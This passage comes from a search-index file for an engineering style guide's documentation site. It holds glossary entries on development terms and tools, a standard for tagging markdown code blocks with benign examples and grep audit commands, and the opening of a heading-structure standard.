examples.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#refactoring","title":"Refactoring","text":"<p>Restructuring existing code without changing its external behavior. Improves code readability, maintainability, or performance.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#regex-regular-expression","title":"Regex (Regular Expression)","text":"<p>A sequence of characters defining a search pattern. Used for text searching, validation, and parsing.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#release-branch","title":"Release Branch","text":"<p>A git branch created from develop to prepare a new production release. Named with <code>release/</code> prefix. Example: <code>release/v1.3.0</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#repository","title":"Repository","text":"<p>A storage location for code managed by version control. Contains all project files, history, and branches.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#rest-representational-state-transfer","title":"REST (Representational State Transfer)","text":"<p>An architectural style for web services that uses HTTP methods (GET, POST, PUT, DELETE) to interact with resources.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#rollback","title":"Rollback","text":"<p>Reverting to a previous version of code or infrastructure after a problematic deployment.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#s","title":"S","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#script","title":"Script","text":"<p>A program written in a scripting language (Bash, Python, PowerShell) to automate tasks.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#semantic-versioning","title":"Semantic Versioning","text":"<p>A versioning scheme using three numbers (MAJOR.MINOR.PATCH) with defined rules for incrementing each. Used throughout this style guide.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#shellcheck","title":"ShellCheck","text":"<p>A static analysis tool for shell scripts. Identifies common errors and provides suggestions for improvement.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#slack-integration","title":"Slack Integration","text":"<p>Connecting a service to Slack for notifications and automation. Common in CI/CD pipelines for build status updates.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#snake_case","title":"snake_case","text":"<p>A naming convention where words are lowercase and separated by underscores. Example: <code>user_authentication</code>. Common in Python and database fields.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#sonarqube","title":"SonarQube","text":"<p>A platform for continuous inspection of code quality. Performs automatic reviews with static analysis to detect bugs and code smells.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#sql-structured-query-language","title":"SQL (Structured Query Language)","text":"<p>A domain-specific language for managing data in relational databases. Used for querying, updating, and managing databases.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#staging-environment","title":"Staging Environment","text":"<p>A replica of the production environment used for final testing before deployment. Should match production configuration closely.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#static-analysis","title":"Static Analysis","text":"<p>Examining code without executing it to find potential errors, security vulnerabilities, and style violations.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#status","title":"Status","text":"<p>The current state of a module or feature. Valid values: draft, in-progress, review, stable, deprecated, archived. Documented with <code>@status</code> metadata tag.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#strict-mode","title":"Strict Mode","text":"<p>A configuration option that treats warnings as errors and enforces stricter validation rules. Example: <code>mkdocs build --strict</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#stub","title":"Stub","text":"<p>A minimal implementation of a function or module used during testing. Provides predetermined responses without real logic.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#t","title":"T","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#tag","title":"Tag","text":"<p>A named reference to a specific commit in Git. Used for marking releases. Example: <code>v1.0.0</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#terraform","title":"Terraform","text":"<p>An infrastructure as code tool that allows defining cloud and on-premises resources in declarative configuration files.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#terragrunt","title":"Terragrunt","text":"<p>A thin wrapper for Terraform that provides extra tools for keeping configurations DRY, managing remote state, and working with multiple modules.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#test-coverage","title":"Test Coverage","text":"<p>A measure of how much code is executed during testing. Expressed as a percentage. Minimum 80% recommended for business logic.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#tflint","title":"tflint","text":"<p>A linter for Terraform that finds possible errors, warns about deprecated syntax, and enforces best practices.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#type-checker","title":"Type Checker","text":"<p>A tool that verifies type correctness in code. Examples: mypy (Python), tsc (TypeScript).</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#typescript","title":"TypeScript","text":"<p>A strongly typed superset of JavaScript that compiles to plain JavaScript. Adds static type definitions to JavaScript.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#u","title":"U","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#unit-test","title":"Unit Test","text":"<p>A test that verifies a small, isolated piece of code (typically a single function or method) works correctly.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#uppercamelcase","title":"UpperCamelCase","text":"<p>See PascalCase. A naming convention where every word starts with an uppercase letter.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#upper_snake_case","title":"UPPER_SNAKE_CASE","text":"<p>A naming convention where words are uppercase and separated by underscores. Example: <code>API_KEY</code>. Used for constants.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#uv","title":"uv","text":"<p>A fast Python package installer and resolver. Modern alternative to pip with improved performance and better dependency resolution.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#v","title":"V","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#validation","title":"Validation","text":"<p>The process of checking that data, code, or configurations meet specified requirements and constraints.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#variable","title":"Variable","text":"<p>A named storage location in a program that holds a value that can be changed during execution.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#version-control","title":"Version Control","text":"<p>A system for tracking changes to files over time. Allows reverting to previous versions and collaborating with multiple developers. Git is the most common version control system.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#vpc-virtual-private-cloud","title":"VPC (Virtual Private Cloud)","text":"<p>An isolated virtual network within a cloud provider (like AWS). Provides security and control over network configuration.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#w","title":"W","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#webhook","title":"Webhook","text":"<p>An HTTP callback that sends real-time data from one application to another when a specific event occurs. Common in CI/CD pipelines.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#whitespace","title":"Whitespace","text":"<p>Characters that represent horizontal or vertical space in text: spaces, tabs, and newlines. Proper whitespace improves code readability.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#workflow","title":"Workflow","text":"<p>A sequence of steps to accomplish a task, often automated in CI/CD systems.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#y","title":"Y","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#yaml-yaml-aint-markup-language","title":"YAML (YAML Ain't Markup Language)","text":"<p>A human-readable data serialization language. Common for configuration files in Ansible, Kubernetes, GitHub Actions, and more.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#yamllint","title":"yamllint","text":"<p>A linter for YAML files that checks syntax and enforces style rules.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#metadata-tags-reference","title":"Metadata Tags Reference","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#api_endpoints","title":"@api_endpoints","text":"<p>Documents HTTP API routes exposed by a module. Format: comma-separated list of <code>METHOD /path</code> pairs.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#author","title":"@author","text":"<p>The original creator or primary maintainer of a module. Helps with accountability and knowledge transfer.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#dependencies","title":"@dependencies","text":"<p>External libraries, packages, or modules required for the code to function. Can include version constraints.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#depends_on","title":"@depends_on","text":"<p>Internal module or file dependencies using relative paths. Shows relationships between code modules.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#description","title":"@description","text":"<p>A clear, concise explanation of what the module does. Should start with a verb and avoid implementation details.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#env","title":"@env","text":"<p>Target deployment environments for the module. Common values: prod, staging, dev, test.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#last_updated","title":"@last_updated","text":"<p>Date of the last significant update to the module. Format: YYYY-MM-DD (ISO 8601).</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#license","title":"@license","text":"<p>The software license governing the code. Examples: MIT, Apache-2.0, GPL-3.0.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#module_1","title":"@module","text":"<p>Unique identifier for a code module or file. Should be descriptive and use lowercase with underscores or hyphens.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#python_version","title":"@python_version","text":"<p>Minimum Python version required. Format: <code>&gt;= 3.9</code>. Used for Python modules.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#security_classification","title":"@security_classification","text":"<p>Data sensitivity level. Values: public, internal, confidential, restricted.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#status_1","title":"@status","text":"<p>Current development or deployment status. Values: draft, in-progress, review, stable, deprecated, archived.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#terraform_version","title":"@terraform_version","text":"<p>Minimum Terraform version required. Format: <code>&gt;= 1.0</code>. Used for Terraform modules.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#version","title":"@version","text":"<p>Semantic version of the module (MAJOR.MINOR.PATCH). Updated according to the type of changes made.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#common-abbreviations","title":"Common Abbreviations","text":"<ul> <li>API: Application Programming Interface</li> <li>AWS: Amazon Web Services</li> <li>CI: Continuous Integration</li> <li>CD: Continuous Deployment/Delivery</li> <li>CLI: Command-Line Interface</li> <li>DRY: Don't Repeat Yourself</li> <li>EOF: End of File</li> <li>HCL: HashiCorp Configuration Language</li> <li>HTTP: Hypertext Transfer Protocol</li> <li>IAC: Infrastructure as Code</li> <li>IDE: Integrated Development Environment</li> <li>JSON: JavaScript Object Notation</li> <li>JWT: JSON Web Token</li> <li>K8s: Kubernetes (8 characters between K and s)</li> <li>LSP: Language Server Protocol</li> <li>NAT: Network Address Translation</li> <li>OAuth: Open Authorization</li> <li>OOP: Object-Oriented Programming</li> <li>OS: Operating System</li> <li>PR: Pull Request</li> <li>REST: Representational State Transfer</li> <li>SEMVER: Semantic Versioning</li> <li>SQL: Structured Query Language</li> <li>SSH: Secure Shell</li> <li>SSL: Secure Sockets Layer</li> <li>TLS: Transport Layer Security</li> <li>URL: Uniform Resource Locator</li> <li>UUID: Universally Unique Identifier</li> <li>VCS: Version Control System</li> <li>VPC: Virtual Private Cloud</li> <li>YAML: YAML Ain't Markup Language</li> </ul>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#tool-names-quick-reference","title":"Tool Names Quick Reference","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#formatters","title":"Formatters","text":"<ul> <li>Black: Python code formatter</li> <li>Prettier: Multi-language code formatter (JS/TS/JSON/YAML)</li> <li>terraform fmt: Terraform configuration formatter</li> <li>shfmt: Shell script formatter</li> </ul>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#linters","title":"Linters","text":"<ul> <li>Flake8: Python linter (style + errors)</li> <li>Pylint: Comprehensive Python linter</li> <li>ESLint: JavaScript/TypeScript linter</li> <li>ShellCheck: Bash/shell script linter</li> <li>tflint: Terraform linter</li> <li>yamllint: YAML linter</li> <li>markdownlint: Markdown linter</li> </ul>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#type-checkers","title":"Type Checkers","text":"<ul> <li>mypy: Python static type checker</li> <li>tsc: TypeScript compiler and type checker</li> </ul>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#testing-frameworks","title":"Testing Frameworks","text":"<ul> <li>pytest: Python testing framework</li> <li>Jest: JavaScript/TypeScript testing framework</li> <li>Mocha: JavaScript test framework</li> <li>RSpec: Ruby testing framework</li> </ul>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#build-tools","title":"Build Tools","text":"<ul> <li>Make: Build automation tool</li> <li>Gradle: Build automation for Java/Kotlin</li> <li>Maven: Build automation and dependency management for Java</li> <li>npm: Node.js package manager and build tool</li> <li>uv: Fast Python package installer</li> </ul>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#cicd-platforms","title":"CI/CD Platforms","text":"<ul> <li>GitHub Actions: CI/CD integrated with GitHub</li> <li>GitLab CI: CI/CD integrated with GitLab</li> <li>Jenkins: Open-source automation server</li> <li>CircleCI: Cloud-based CI/CD platform</li> <li>Travis CI: CI service for GitHub projects</li> </ul> <p>Total Terms: 150+</p> <p>For additional terms or clarifications, please refer to the specific language guides or open an issue on the GitHub repository.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"00_standards/code_block_language_tags/","title":"Code Block Language Tag Standards","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#purpose","title":"Purpose","text":"<p>This document defines the standardized language tags for all code blocks in the Dukes Engineering Style Guide documentation. Consistent language tags enable proper syntax highlighting, improve readability, and ensure a professional presentation of code examples.</p>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#general-principles","title":"General Principles","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#language-tag-requirements","title":"Language Tag Requirements","text":"<ol> <li>All code blocks MUST have a language tag - No untagged code blocks (```) are allowed</li> <li>Use the canonical tag name - Follow the standard names defined in this document</li> <li>Be specific when possible - Use <code>typescript</code> not <code>javascript</code> for TypeScript code</li> <li>Match the actual content - Don't tag Python code as <code>bash</code> or vice versa</li> </ol>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#syntax","title":"Syntax","text":"<pre><code>\\```languagetag\ncode here\n\\```\n</code></pre> <p>Examples:</p> <pre><code>\\```python\ndef hello_world():\n    print(\"Hello, World!\")\n\\```\n\n\\```bash\necho \"Hello, World!\"\n\\```\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#canonical-language-tags","title":"Canonical Language Tags","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#infrastructure-as-code","title":"Infrastructure as Code","text":"Language/Tool Tag Alternative Tags (Avoid) Notes Terraform <code>hcl</code> <code>terraform</code>, <code>tf</code> Use HCL for Terraform code Terragrunt <code>hcl</code> <code>terragrunt</code> Terragrunt uses HCL syntax AWS CDK (TypeScript) <code>typescript</code> <code>ts</code>, <code>cdk</code> Use TypeScript tag AWS CDK (Python) <code>python</code> <code>py</code>, <code>cdk</code> Use Python tag Kubernetes YAML <code>yaml</code> <code>yml</code>, <code>k8s</code>, <code>kubernetes</code> Use YAML tag Helm Templates <code>yaml</code> <code>helm</code>, <code>gotmpl</code> Use YAML for values files Helm Chart.yaml <code>yaml</code> <code>helm</code> Use YAML tag","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#configuration-management","title":"Configuration Management","text":"Language/Tool Tag Alternative Tags (Avoid) Notes Ansible Playbooks <code>yaml</code> <code>yml</code>, <code>ansible</code> Use YAML tag Ansible Inventory <code>ini</code> <code>ansible</code> For INI-format inventory","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#programming-languages","title":"Programming Languages","text":"Language Tag Alternative Tags (Avoid) Notes Python <code>python</code> <code>py</code>, <code>python3</code> Always use <code>python</code> TypeScript <code>typescript</code> <code>ts</code> Always use full name JavaScript <code>javascript</code> <code>js</code> Always use full name Bash <code>bash</code> <code>sh</code>, <code>shell</code>, <code>zsh</code> Use <code>bash</code> for shell scripts PowerShell <code>powershell</code> <code>ps1</code>, <code>posh</code> Use <code>powershell</code> SQL <code>sql</code> Generic SQL tag Go <code>go</code> <code>golang</code> Use <code>go</code> Ruby <code>ruby</code> <code>rb</code> Use <code>ruby</code>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#cicd-automation","title":"CI/CD &amp; Automation","text":"Tool Tag Alternative Tags (Avoid) Notes GitHub Actions <code>yaml</code> <code>yml</code>, <code>github-actions</code> Use YAML tag GitLab CI <code>yaml</code> <code>yml</code>, <code>gitlab-ci</code> Use YAML tag Jenkins (Declarative) <code>groovy</code> <code>jenkinsfile</code> Use Groovy tag Jenkins (Scripted) <code>groovy</code> <code>jenkins</code> Use Groovy tag Makefile <code>makefile</code> <code>make</code>, <code>mk</code> Use <code>makefile</code>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#data-configuration-formats","title":"Data &amp; Configuration Formats","text":"Format Tag Alternative Tags (Avoid) Notes YAML <code>yaml</code> <code>yml</code> Always use <code>yaml</code> JSON <code>json</code> Standard JSON JSON5 <code>json5</code> JSON with extensions (comments, trailing commas) JSONC <code>jsonc</code> JSON with Comments (VS Code format) TOML <code>toml</code> TOML configuration files INI <code>ini</code> <code>cfg</code>, <code>conf</code> INI format files XML <code>xml</code> XML documents Properties <code>properties</code> <code>props</code> Java properties files","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#containerization","title":"Containerization","text":"Tool/File Tag Alternative Tags (Avoid) Notes Dockerfile <code>dockerfile</code> <code>docker</code> Always use <code>dockerfile</code> Docker Compose <code>yaml</code> <code>yml</code>, <code>docker-compose</code> Use YAML tag .dockerignore <code>dockerignore</code> <code>gitignore</code>, <code>text</code> Use <code>dockerignore</code>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#special-purpose-tags","title":"Special Purpose Tags","text":"Purpose Tag When to Use Plain text <code>text</code> Unformatted text, placeholders, generic output Markdown <code>markdown</code> When showing markdown syntax examples Git config <code>gitignore</code> For <code>.gitignore</code> file examples Environment <code>env</code> For <code>.env</code> file examples Templates <code>jinja2</code> For Jinja2 template examples Vim script <code>vim</code> For <code>.vimrc</code> or Vim configuration Emacs Lisp <code>elisp</code> For Emacs configuration Nginx config <code>nginx</code> For nginx.conf examples Mermaid diagrams <code>mermaid</code> For Mermaid diagram code Lua <code>lua</code> For Lua scripts (e.g., Neovim config)","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#json-variants","title":"JSON Variants","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#when-to-use-each-json-tag","title":"When to Use Each JSON Tag","text":"<p>Use <code>json</code> for:</p> <ul> <li>Standard JSON configuration files</li> <li>API request/response examples</li> <li>Package.json, tsconfig.json (strict JSON)</li> <li>Any JSON that must be strictly valid</li> </ul> <p>Use <code>json5</code> for:</p> <ul> <li>Configuration files that support JSON5 (comments, trailing commas)</li> <li>Examples showing JSON5 features explicitly</li> <li>Documentation where you want to include inline comments</li> </ul> <p>Use <code>jsonc</code> for:</p> <ul> <li>VS Code configuration files (settings.json, etc.)</li> <li>Any Microsoft tool configuration that uses JSONC</li> <li>When specifically documenting VS Code integration</li> </ul>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#code-block-examples","title":"Code Block Examples","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#good-examples","title":"Good Examples","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#python-with-proper-tag","title":"Python with Proper Tag","text":"<pre><code>```python\nfrom typing import List\n\ndef process_data(items: List[str]) -&gt; None:\n    \"\"\"Process a list of items.\"\"\"\n    for item in items:\n        print(f\"Processing: {item}\")\n```\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#bash-script-with-proper-tag","title":"Bash Script with Proper Tag","text":"<pre><code>```bash\n#!/bin/bash\nset -euo pipefail\n\necho \"Starting deployment...\"\nkubectl apply -f deployment.yaml\n```\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#yaml-configuration-with-proper-tag","title":"YAML Configuration with Proper Tag","text":"<pre><code>```yaml\nversion: '3.8'\nservices:\n  web:\n    image: nginx:latest\n    ports:\n      - \"80:80\"\n```\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#bad-examples-dont-do-this","title":"Bad Examples (Don't Do This)","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#missing-language-tag","title":"Missing Language Tag","text":"<pre><code>\u274c ```\ndef hello():\n    print(\"No language tag!\")\n```\n</code></pre> <p>Fix: Add <code>python</code> tag</p> <pre><code>\u2705 ```python\ndef hello():\n    print(\"No language tag!\")\n```\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#wrong-language-tag","title":"Wrong Language Tag","text":"<pre><code>\u274c ```javascript\n// This is actually TypeScript\ninterface User {\n    id: number;\n    name: string;\n}\n```\n</code></pre> <p>Fix: Use <code>typescript</code> tag</p> <pre><code>\u2705 ```typescript\n// This is actually TypeScript\ninterface User {\n    id: number;\n    name: string;\n}\n```\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#using-abbreviation","title":"Using Abbreviation","text":"<pre><code>\u274c ```sh\n#!/bin/bash\necho \"Wrong tag!\"\n```\n</code></pre> <p>Fix: Use canonical <code>bash</code> tag</p> <pre><code>\u2705 ```bash\n#!/bin/bash\necho \"Correct tag!\"\n```\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#nested-code-blocks","title":"Nested Code Blocks","text":"<p>When showing markdown examples that contain code blocks (like in this document), use 4 backticks for the outer block and 3 for the inner block:</p> <pre><code>````markdown\n```python\n## This is shown as an example\nprint(\"Hello\")\n```\n````\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#template-placeholders","title":"Template Placeholders","text":"<p>For template files that show placeholder code, use the appropriate language tag for the target language, not a generic <code>text</code> tag:</p> <p>Template Example:</p> <pre><code>[language-extension]\n</code></pre> <p>Preferred - When showing a Python template:</p> <pre><code>## Replace [function_name] with actual function name\ndef [function_name]([parameters]):\n    \"\"\"Replace with actual docstring.\"\"\"\n    pass\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#verification","title":"Verification","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#automated-checking","title":"Automated Checking","text":"<p>You can verify all code blocks have language tags using:</p> <pre><code>## Find code blocks without language tags\ngrep -rn '^```$' docs/\n</code></pre> <p>Expected result: Only closing ``` blocks (which correctly have no tag)</p>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#language-tag-audit","title":"Language Tag Audit","text":"<p>To see all language tags currently in use:</p> <pre><code>grep -rh '^```\\w' docs/ | sed 's/```//' | sort | uniq -c | sort -rn\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#enforcement","title":"Enforcement","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#pre-commit-hooks","title":"Pre-commit Hooks","text":"<p>Add markdownlint rules to enforce language tags:</p> <pre><code>## .markdownlint.yaml\nMD040:  # Fenced code blocks should have a language specified\n  enabled: true\n  allowed_languages: []  # Empty = allow any language\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#cicd-validation","title":"CI/CD Validation","text":"<p>Include in GitHub Actions workflow:</p> <pre><code>- name: Check code blocks have language tags\n  run: |\n    if grep -rn '^```\\s*$' docs/ --include=\"*.md\" | grep -v '```$'; then\n      echo \"Found code blocks without language tags!\"\n      exit 1\n    fi\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#migration-guide","title":"Migration Guide","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#updating-existing-documentation","title":"Updating Existing Documentation","text":"<p>If you find code blocks without language tags:</p> <ol> <li>Identify the language based on content</li> <li>Choose the canonical tag from this document</li> <li>Add the tag to the opening fence</li> <li>Verify syntax highlighting works in preview</li> </ol>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#example-migration","title":"Example Migration","text":"<p>Before:</p> <pre><code>```\nkubectl get pods\n```\n</code></pre> <p>After:</p> <pre><code>```bash\nkubectl get pods\n```\n</code></pre>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#current-status","title":"Current Status","text":"<p>As of 2025-12-07:</p> <ul> <li>\u2705 All 1,501 code blocks in documentation have language tags</li> <li>\u2705 32 unique language tags in use</li> <li>\u2705 Consistent usage across most languages</li> <li>\u26a0\ufe0f  JSON has 3 variants (json, json5, jsonc) - all valid for different use cases</li> </ul>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#see-also","title":"See Also","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#related-standards","title":"Related Standards","text":"<ul> <li>Heading Structure Standards - Documentation heading hierarchy</li> <li>Metadata Schema - Frontmatter standards</li> </ul>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#language-guides","title":"Language Guides","text":"<ul> <li>Python Guide - Python code examples</li> <li>TypeScript Guide - TypeScript examples</li> <li>Bash Guide - Shell script examples</li> <li>Terraform Guide - HCL code examples</li> </ul>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#cicd-documentation","title":"CI/CD Documentation","text":"<ul> <li>Pre-commit Hooks Guide - Automated validation</li> <li>GitHub Actions Guide - CI/CD integration</li> </ul>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#references","title":"References","text":"","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#external-resources","title":"External Resources","text":"<ul> <li>GitHub Flavored Markdown Spec - Fenced code blocks</li> <li>Linguist Languages - GitHub language definitions</li> <li>Prism Supported Languages - Syntax highlighting support</li> <li>Pygments Lexers - Python syntax highlighting lexers</li> </ul>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/code_block_language_tags/#version-history","title":"Version History","text":"<ul> <li>v1.0.0 (2025-12-07): Initial code block language tag standards</li> </ul>","tags":["standards","documentation","code-blocks","markdown","syntax-highlighting"]},{"location":"00_standards/heading_structure/","title":"Documentation Heading Structure Standards","text":"","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#purpose","title":"Purpose","text":"<p>This document defines the standardized heading structure for all documentation in the Dukes Engineering Style Guide. Consistent heading hierarchies improve navigation, readability, and maintainability.</p>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#general-heading-principles","title":"General Heading Principles","text":"","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#hierarchy-rules","title":"Hierarchy Rules","text":"<ul> <li>Level 1 (<code>#</code>): Reserved for document title (automatically generated from frontmatter <code>title</code>)</li> <li>Level 2 (<code>##</code>): Major sections</li> <li>Level 3 (<code>###</code>): Subsections within major sections</li> <li>Level 4 (<code>####</code>): Specific topics within subsections (use sparingly)</li> <li>Level 5 (<code>#####</code>): Avoid unless absolutely necessary</li> <li>Level 6 (<code>######</code>): Never use</li> </ul>","tags":["standards","documentation","headings","structure","consistency"]},{"location":"00_standards/heading_structure/#heading-style","title":"Heading Style","text":"<ul> <li>Capitalization: Title Case for Level 2, Sentence case for Level 3+</li> <li>Length: Keep headings concise (max 60 characters)</li> <li>Keywords: Include searchable keywords</li> <li>Consistency: Use consistent terminology across similar sections</li> 